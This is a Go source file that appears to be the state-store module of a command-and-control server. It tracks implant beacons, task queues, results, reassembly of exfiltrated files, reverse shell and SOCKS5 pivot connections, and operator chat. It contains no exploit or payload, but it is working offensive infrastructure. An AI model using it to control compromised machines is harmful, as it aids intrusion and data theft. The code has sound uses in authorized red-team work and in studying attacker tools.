package store

import (
	"context"
	"database/sql"
	"fmt"
	"net"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"c2/models"
	"c2/ui"
)

type exfilFragment struct {
	Identifier uint32
	Data       []byte
}

type exfilState struct {
	Filename  string
	Fragments []exfilFragment
	CreatedAt time.Time
}

// Session represents an active TCP session for a beacon.
type Session struct {
	BeaconID  uint32
	Conn      net.Conn
	Active    bool
	CreatedAt time.Time
}

// SocksProxy tracks an active SOCKS5 proxy for a beacon.
type SocksProxy struct {
	BeaconID   uint32
	Host       string
	Port       int
	Listener   net.Listener
	Conn       net.Conn
	Channels   map[uint32]net.Conn
	NextChanID atomic.Uint32
	Mu         sync.RWMutex
}

type Store struct {
	mu             sync.RWMutex
	beacons        map[uint32]*models.Beacon
	listeners      map[uint32]*models.Listener
	listenerSeq    uint32
	exfilFragments map[uint32]*exfilState
	exfilFiles     map[uint32]*models.ExfilEntry
	events         []*models.Event
	terminals      map[uint32]*models.TerminalState
	sessions       map[uint32]*Session
	shellConns     map[uint32]net.Conn
	socksProxies   map[uint32]*SocksProxy
	db             *sql.DB
}

func New(dbPath string) (*Store, error) {
	db, err := openDB(dbPath)
	if err != nil {
		return nil, err
	}
	return &Store{
		beacons:        make(map[uint32]*models.Beacon),
		listeners:      make(map[uint32]*models.Listener),
		exfilFragments: make(map[uint32]*exfilState),
		exfilFiles:     make(map[uint32]*models.ExfilEntry),
		terminals:      make(map[uint32]*models.TerminalState),
		sessions:       make(map[uint32]*Session),
		shellConns:     make(map[uint32]net.Conn),
		socksProxies:   make(map[uint32]*SocksProxy),
		db:             db,
	}, nil
}

func (s *Store) Close() error {
	if s.db != nil {
		return s.db.Close()
	}
	return nil
}

func (s *Store) RegisterBeacon(meta *models.ImplantMetadata) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, exists := s.beacons[meta.ID]; exists {
		return false
	}
	now := time.Now()
	s.beacons[meta.ID] = &models.Beacon{
		ImplantMetadata: *meta,
		FirstSeen:       now,
		LastSeen:        now,
	}
	return true
}

// GetBeacon returns a snapshot copy of the beacon to avoid aliasing with
// internal state mutated by UpdateLastSeen and RegisterBeacon.
func (s *Store) GetBeacon(id uint32) *models.Beacon {
	s.mu.RLock()
	defer s.mu.RUnlock()
	b, ok := s.beacons[id]
	if !ok {
		return nil
	}
	snapshot := *b
	return &snapshot
}

func (s *Store) UpdateLastSeen(id uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if b, ok := s.beacons[id]; ok {
		b.LastSeen = time.Now()
	}
}

func (s *Store) UpdateBeaconSleep(id, sleep, jitter uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if b, ok := s.beacons[id]; ok {
		b.Sleep = sleep
		b.Jitter = jitter
	}
}

// HasPendingTaskType returns true if the beacon has a pending or sent task of the given type.
func (s *Store) HasPendingTaskType(beaconID uint32, taskType uint8) bool {
	var exists bool
	err := s.db.QueryRow(
		`SELECT EXISTS(SELECT 1 FROM tasks WHERE beacon_id = ? AND type = ? AND status IN (?, ?))`,
		beaconID, taskType, models.TaskStatusPending, models.TaskStatusSent,
	).Scan(&exists)
	if err != nil {
		ui.Errorf("store", "has pending task type: %v", err)
		return false
	}
	return exists
}

func (s *Store) QueueTask(t *models.Task) {
	t.CreatedAt = time.Now()
	_, err := s.db.Exec(
		`INSERT INTO tasks (label, beacon_id, type, code, flags, identifier, data, status, created_at)
		 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		t.Label, t.BeaconID, t.Type, t.Code, t.Flags, t.Identifier, t.Data, t.Status, t.CreatedAt,
	)
	if err != nil {
		ui.Errorf("store", "queue task: %v", err)
	}
}

func (s *Store) GetNextTask(beaconID uint32) *models.Task {
	t := &models.Task{}
	err := s.db.QueryRow(
		`SELECT label, beacon_id, type, code, flags, identifier, data, status, created_at
		 FROM tasks WHERE beacon_id = ? AND status = ? ORDER BY id LIMIT 1`,
		beaconID, models.TaskStatusPending,
	).Scan(&t.Label, &t.BeaconID, &t.Type, &t.Code, &t.Flags, &t.Identifier, &t.Data, &t.Status, &t.CreatedAt)
	if err != nil {
		return nil
	}
	_, err = s.db.Exec(`UPDATE tasks SET status = ? WHERE label = ?`, models.TaskStatusSent, t.Label)
	if err != nil {
		ui.Errorf("store", "mark task sent: %v", err)
	}
	t.Status = models.TaskStatusSent
	return t
}

func (s *Store) DrainPendingTasks(beaconID uint32) []*models.Task {
	rows, err := s.db.Query(
		`SELECT label, beacon_id, type, code, flags, identifier, data, status, created_at
		 FROM tasks WHERE beacon_id = ? AND status = ? ORDER BY id LIMIT 32`,
		beaconID, models.TaskStatusPending,
	)
	if err != nil {
		ui.Errorf("store", "drain tasks: %v", err)
		return nil
	}
	defer rows.Close()

	var out []*models.Task
	var labels []any
	for rows.Next() {
		t := &models.Task{}
		if err := rows.Scan(&t.Label, &t.BeaconID, &t.Type, &t.Code, &t.Flags, &t.Identifier, &t.Data, &t.Status, &t.CreatedAt); err != nil {
			ui.Errorf("store", "scan task: %v", err)
			continue
		}
		t.Status = models.TaskStatusSent
		out = append(out, t)
		labels = append(labels, t.Label)
	}

	if len(labels) > 0 {
		query := "UPDATE tasks SET status = ? WHERE label IN (?" + strings.Repeat(",?", len(labels)-1) + ")"
		args := append([]any{models.TaskStatusSent}, labels...)
		if _, err := s.db.Exec(query, args...); err != nil {
			ui.Errorf("store", "mark tasks sent: %v", err)
		}
	}

	return out
}

func (s *Store) MarkTaskDone(label uint32) {
	_, err := s.db.Exec(`UPDATE tasks SET status = ? WHERE label = ?`, models.TaskStatusCompleted, label)
	if err != nil {
		ui.Errorf("store", "mark task done: %v", err)
	}
}

func (s *Store) ListBeacons() []*models.Beacon {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.Beacon, 0, len(s.beacons))
	for _, b := range s.beacons {
		snapshot := *b
		out = append(out, &snapshot)
	}
	return out
}

func (s *Store) StoreResult(r *models.Result) {
	if r.ReceivedAt.IsZero() {
		r.ReceivedAt = time.Now()
	}
	_, err := s.db.Exec(
		`INSERT INTO results (label, beacon_id, flags, type, filename, output, received_at)
		 VALUES (?, ?, ?, ?, ?, ?, ?)`,
		r.Label, r.BeaconID, r.Flags, r.Type, r.Filename, r.Output, r.ReceivedAt,
	)
	if err != nil {
		ui.Errorf("store", "store result: %v", err)
	}
}

func (s *Store) GetResults(beaconID uint32) []*models.Result {
	rows, err := s.db.Query(
		`SELECT label, beacon_id, flags, type, filename, output, received_at
		 FROM results WHERE beacon_id = ? ORDER BY id`,
		beaconID,
	)
	if err != nil {
		ui.Errorf("store", "get results: %v", err)
		return nil
	}
	defer rows.Close()
	return scanResults(rows)
}

func (s *Store) GetResultsSince(beaconID uint32, since int64) []*models.Result {
	t := time.Unix(since, 0)
	rows, err := s.db.Query(
		`SELECT label, beacon_id, flags, type, filename, output, received_at
		 FROM results WHERE beacon_id = ? AND received_at > ? ORDER BY id`,
		beaconID, t,
	)
	if err != nil {
		ui.Errorf("store", "get results since: %v", err)
		return nil
	}
	defer rows.Close()
	return scanResults(rows)
}

// AllResults returns all results indexed by beacon ID.
func (s *Store) AllResults() map[uint32][]*models.Result {
	rows, err := s.db.Query(
		`SELECT label, beacon_id, flags, type, filename, output, received_at
		 FROM results ORDER BY beacon_id, received_at`,
	)
	if err != nil {
		ui.Errorf("store", "all results: %v", err)
		return nil
	}
	defer rows.Close()

	out := make(map[uint32][]*models.Result)
	for _, r := range scanResults(rows) {
		out[r.BeaconID] = append(out[r.BeaconID], r)
	}
	return out
}

func scanResults(rows *sql.Rows) []*models.Result {
	var out []*models.Result
	for rows.Next() {
		r := &models.Result{}
		if err := rows.Scan(&r.Label, &r.BeaconID, &r.Flags, &r.Type, &r.Filename, &r.Output, &r.ReceivedAt); err != nil {
			ui.Errorf("store", "scan result: %v", err)
			continue
		}
		out = append(out, r)
	}
	return out
}

// DeleteBeacon removes a beacon and all associated tasks and results.
func (s *Store) DeleteBeacon(id uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.beacons, id)

	if _, err := s.db.Exec(`DELETE FROM tasks WHERE beacon_id = ?`, id); err != nil {
		ui.Errorf("store", "delete beacon tasks: %v", err)
	}
	if _, err := s.db.Exec(`DELETE FROM results WHERE beacon_id = ?`, id); err != nil {
		ui.Errorf("store", "delete beacon results: %v", err)
	}
}

// AddListener assigns a unique ID to l and stores it.
func (s *Store) AddListener(l *models.Listener) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.listenerSeq++
	l.ID = s.listenerSeq
	s.listeners[l.ID] = l
}

// GetListener returns the listener with the given ID, or nil.
func (s *Store) GetListener(id uint32) *models.Listener {
	s.mu.RLock()
	defer s.mu.RUnlock()
	l, ok := s.listeners[id]
	if !ok {
		return nil
	}
	snapshot := *l
	return &snapshot
}

// ListListeners returns all listeners in insertion order.
func (s *Store) ListListeners() []*models.Listener {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.Listener, 0, len(s.listeners))
	for i := uint32(1); i <= s.listenerSeq; i++ {
		if l, ok := s.listeners[i]; ok {
			out = append(out, l)
		}
	}
	return out
}

// PortInUse returns true if any stored listener is already using port.
func (s *Store) PortInUse(port int) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	for _, l := range s.listeners {
		if l.Port == port {
			return true
		}
	}
	return false
}

// RemoveListener deletes the listener with the given ID.
func (s *Store) RemoveListener(id uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.listeners, id)
}

// LoadBeacons inserts beacons directly without touching tasks or results.
// Used only at startup to restore a saved session.
func (s *Store) LoadBeacons(bs []*models.Beacon) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, b := range bs {
		s.beacons[b.ID] = b
	}
}

// LoadListeners inserts listeners directly and advances listenerSeq to max(ID).
// Used only at startup to restore a saved session.
func (s *Store) LoadListeners(ls []*models.Listener) {
	s.mu.Lock()
	defer s.mu.Unlock()
	var maxID uint32
	for _, l := range ls {
		s.listeners[l.ID] = l
		if l.ID > maxID {
			maxID = l.ID
		}
	}
	s.listenerSeq = maxID
}

// AddExfilFragment accumulates one incoming exfil fragment.
// Fragment 0 must carry [uint16 name_len][name bytes][chunk bytes].
// Subsequent fragments carry only [chunk bytes].
// Returns (done, filename, assembledData) when last fragment arrives (Flags & 8 != 0).
// Returns (false, "", nil) otherwise.
func (s *Store) AddExfilFragment(label, identifier uint32, flags uint16, raw []byte) (bool, string, []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	state, ok := s.exfilFragments[label]
	if !ok {
		state = &exfilState{CreatedAt: time.Now()}
		s.exfilFragments[label] = state
	}

	const maxFragments = 16384
	const maxExfilSize = 100 * 1024 * 1024

	chunkData := raw
	if identifier == 0 && len(raw) >= 2 {
		nameLen := uint16(raw[0]) | uint16(raw[1])<<8
		if int(nameLen)+2 <= len(raw) {
			state.Filename = string(raw[2 : 2+nameLen])
			chunkData = raw[2+nameLen:]
		}
	}

	if len(state.Fragments) >= maxFragments {
		delete(s.exfilFragments, label)
		return false, "", nil
	}

	var totalSize int
	for _, f := range state.Fragments {
		totalSize += len(f.Data)
	}
	if totalSize+len(chunkData) > maxExfilSize {
		delete(s.exfilFragments, label)
		return false, "", nil
	}

	for _, f := range state.Fragments {
		if f.Identifier == identifier {
			return false, "", nil
		}
	}

	cp := make([]byte, len(chunkData))
	copy(cp, chunkData)
	state.Fragments = append(state.Fragments, exfilFragment{Identifier: identifier, Data: cp})

	if flags&8 == 0 {
		return false, "", nil
	}

	sort.Slice(state.Fragments, func(i, j int) bool {
		return state.Fragments[i].Identifier < state.Fragments[j].Identifier
	})
	var assembled []byte
	for _, f := range state.Fragments {
		assembled = append(assembled, f.Data...)
	}
	name := state.Filename
	delete(s.exfilFragments, label)
	return true, name, assembled
}

// MarkExfilDone stores metadata for a completed exfil file.
func (s *Store) MarkExfilDone(label uint32, filename string, beaconID uint32, size int64) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.exfilFiles[label] = &models.ExfilEntry{
		Label:    label,
		Filename: filename,
		BeaconID: beaconID,
		Size:     size,
		ExfilAt:  time.Now(),
	}
}

func (s *Store) ListExfilFiles() []*models.ExfilEntry {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.ExfilEntry, 0, len(s.exfilFiles))
	for _, e := range s.exfilFiles {
		cp := *e
		out = append(out, &cp)
	}
	return out
}

// GetExfilFile returns the ExfilEntry for label, or nil.
func (s *Store) GetExfilFile(label uint32) *models.ExfilEntry {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.exfilFiles[label]
}

// DeleteExfilFile removes the exfil entry from the store.
func (s *Store) DeleteExfilFile(label uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.exfilFiles, label)
}

// LoadLoot restores exfil entries (used at startup).
func (s *Store) LoadLoot(files []*models.ExfilEntry) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, f := range files {
		s.exfilFiles[f.Label] = f
	}
}

// AddEvent appends an event to the log (capped at maxEvents).
func (s *Store) AddEvent(e *models.Event) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.addEventCapped(e)
}

// StartPruner launches a background goroutine that periodically cleans
// abandoned exfil uploads. Stops when ctx is cancelled.
func (s *Store) StartPruner(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(pruneInterval)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				s.PruneStaleExfil()
			}
		}
	}()
}

// ListEvents returns all events.
func (s *Store) ListEvents() []*models.Event {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*models.Event, len(s.events))
	copy(out, s.events)
	return out
}

// GetTerminal returns the terminal state for a beacon.
func (s *Store) GetTerminal(id uint32) *models.TerminalState {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.terminals[id]
}

// SetTerminal saves terminal state for a beacon.
func (s *Store) SetTerminal(id uint32, state *models.TerminalState) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.terminals[id] = state
}

// ListTerminals returns all terminal states.
func (s *Store) ListTerminals() map[uint32]*models.TerminalState {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make(map[uint32]*models.TerminalState, len(s.terminals))
	for k, v := range s.terminals {
		out[k] = v
	}
	return out
}

// LoadTerminals replaces all terminal states (used at startup).
func (s *Store) LoadTerminals(ts map[uint32]*models.TerminalState) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.terminals = ts
}

// LoadEvents replaces the event log (used at startup from persistence).
func (s *Store) LoadEvents(evts []*models.Event) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.events = evts
}

const maxEvents = 1000
const exfilTTL = 10 * time.Minute
const pruneInterval = 2 * time.Minute

// PruneStaleExfil removes partial exfil uploads older than exfilTTL.
func (s *Store) PruneStaleExfil() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	cutoff := time.Now().Add(-exfilTTL)
	pruned := 0
	for label, state := range s.exfilFragments {
		if state.CreatedAt.Before(cutoff) {
			delete(s.exfilFragments, label)
			pruned++
		}
	}
	return pruned
}

// AddEvent appends an event and trims oldest if over cap.
func (s *Store) addEventCapped(e *models.Event) {
	s.events = append(s.events, e)
	if len(s.events) > maxEvents {
		s.events = s.events[len(s.events)-maxEvents:]
	}
}

// RegisterSession stores an active TCP session for a beacon.
func (s *Store) RegisterSession(beaconID uint32, conn net.Conn) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if old, ok := s.sessions[beaconID]; ok && old.Conn != nil {
		old.Conn.Close()
	}
	s.sessions[beaconID] = &Session{
		BeaconID:  beaconID,
		Conn:      conn,
		Active:    true,
		CreatedAt: time.Now(),
	}
}

// GetSession returns the active session for beaconID, or nil.
func (s *Store) GetSession(beaconID uint32) *Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	sess, ok := s.sessions[beaconID]
	if !ok || !sess.Active {
		return nil
	}
	return sess
}

// RemoveSession closes the connection and removes the session.
func (s *Store) RemoveSession(beaconID uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if sess, ok := s.sessions[beaconID]; ok {
		if sess.Conn != nil {
			sess.Conn.Close()
		}
		delete(s.sessions, beaconID)
	}
}

// IsSession returns true if the beacon has an active TCP session.
func (s *Store) IsSession(beaconID uint32) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	sess, ok := s.sessions[beaconID]
	return ok && sess.Active
}

// RegisterShell stores a shell-only TCP connection for a beacon.
func (s *Store) RegisterShell(beaconID uint32, conn net.Conn) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if old, ok := s.shellConns[beaconID]; ok && old != nil {
		old.Close()
	}
	s.shellConns[beaconID] = conn
}

// GetShellConn returns the shell TCP connection for beaconID, or nil.
func (s *Store) GetShellConn(beaconID uint32) net.Conn {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.shellConns[beaconID]
}

// RemoveShell removes the shell connection for a beacon (does not close it).
func (s *Store) RemoveShell(beaconID uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.shellConns, beaconID)
}

// IsShell returns true if the beacon has an active shell TCP connection.
func (s *Store) IsShell(beaconID uint32) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	_, ok := s.shellConns[beaconID]
	return ok
}

// ActiveSessionCount returns the number of active TCP sessions and shells.
func (s *Store) ActiveSessionCount() (sessions int, shells int) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	for _, sess := range s.sessions {
		if sess.Active {
			sessions++
		}
	}
	shells = len(s.shellConns)
	return
}

// RegisterSocksProxy stores a new SOCKS5 proxy for a beacon.
func (s *Store) RegisterSocksProxy(proxy *SocksProxy) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.socksProxies[proxy.BeaconID] = proxy
}

// GetSocksProxy returns the SOCKS5 proxy for beaconID, or nil.
func (s *Store) GetSocksProxy(beaconID uint32) *SocksProxy {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.socksProxies[beaconID]
}

// RemoveSocksProxy removes the SOCKS5 proxy for a beacon (does not close it).
func (s *Store) RemoveSocksProxy(beaconID uint32) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.socksProxies, beaconID)
}

// ListSocksProxies returns a snapshot of all active SOCKS5 proxies.
func (s *Store) ListSocksProxies() []*SocksProxy {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*SocksProxy, 0, len(s.socksProxies))
	for _, p := range s.socksProxies {
		out = append(out, p)
	}
	return out
}

// HasSocksProxy returns true if the beacon has an active SOCKS5 proxy.
func (s *Store) HasSocksProxy(beaconID uint32) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	_, ok := s.socksProxies[beaconID]
	return ok
}

// AddChatMessage inserts a chat message and returns the persisted row,
// including the generated ID and server-assigned timestamp.
func (s *Store) AddChatMessage(operator, message string) (*models.ChatMessage, error) {
	const q = `
		INSERT INTO chat_messages (operator, message)
		VALUES (?, ?)
		RETURNING id, created_at
	`
	row := s.db.QueryRow(q, operator, message)
	var id int64
	var createdAt time.Time
	if err := row.Scan(&id, &createdAt); err != nil {
		return nil, fmt.Errorf("insert chat message: %w", err)
	}
	return &models.ChatMessage{
		ID:        id,
		Operator:  operator,
		Message:   message,
		Timestamp: createdAt,
	}, nil
}

// ListChatMessages returns the most recent `limit` chat messages in
// chronological order (oldest first). limit==0 returns all messages.
// Errors are logged and an empty slice is returned, matching the
// no-error return style of ListEvents / ListListeners.
func (s *Store) ListChatMessages(limit int) []*models.ChatMessage {
	var (
		rows *sql.Rows
		err  error
	)
	if limit <= 0 {
		rows, err = s.db.Query(`
			SELECT id, operator, message, created_at
			FROM chat_messages
			ORDER BY id ASC
		`)
	} else {
		rows, err = s.db.Query(`
			SELECT id, operator, message, created_at
			FROM (
				SELECT id, operator, message, created_at
				FROM chat_messages
				ORDER BY id DESC
				LIMIT ?
			)
			ORDER BY id ASC
		`, limit)
	}
	if err != nil {
		ui.Errorf("store", "list chat messages: %v", err)
		return nil
	}
	defer rows.Close()

	var out []*models.ChatMessage
	for rows.Next() {
		m := &models.ChatMessage{}
		if err := rows.Scan(&m.ID, &m.Operator, &m.Message, &m.Timestamp); err != nil {
			ui.Errorf("store", "scan chat message: %v", err)
			continue
		}
		out = append(out, m)
	}
	return out
}

// ResetChatMessages truncates the chat_messages table.
func (s *Store) ResetChatMessages() error {
	if _, err := s.db.Exec(`DELETE FROM chat_messages`); err != nil {
		return fmt.Errorf("reset chat messages: %w", err)
	}
	return nil
}

func (s *Store) ChatMessageCount() int {
	var count int
	s.db.QueryRow("SELECT COUNT(*) FROM chat_messages").Scan(&count)
	return count
}
